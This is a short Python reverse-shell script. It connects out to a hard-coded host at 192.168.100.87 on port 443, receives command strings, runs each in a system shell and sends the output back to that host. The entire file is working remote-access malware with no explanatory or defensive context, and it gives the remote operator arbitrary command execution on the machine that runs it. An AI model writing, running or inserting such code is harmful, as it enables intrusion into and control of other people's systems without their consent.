import socket as s
import subprocess as sb

H = "192.168.100.87"
P = 443
BF = 1024

C = s.socket(s.AF_INET, s.SOCK_STREAM)
C.connect((H, P))

while True:
    try:
        D = C.recv(BF)
        if not D:
            break
        code = D.decode("utf-8").rstrip()
        if len(code) > 1:
            try:
                output = sb.check_output(code, stderr=sb.STDOUT, shell=True)
            except sb.CalledProcessError as e:
                output = e
            C.send(output)
    except Exception as e:
        print(f"Error receiving data: {e}")
        break


C.close()
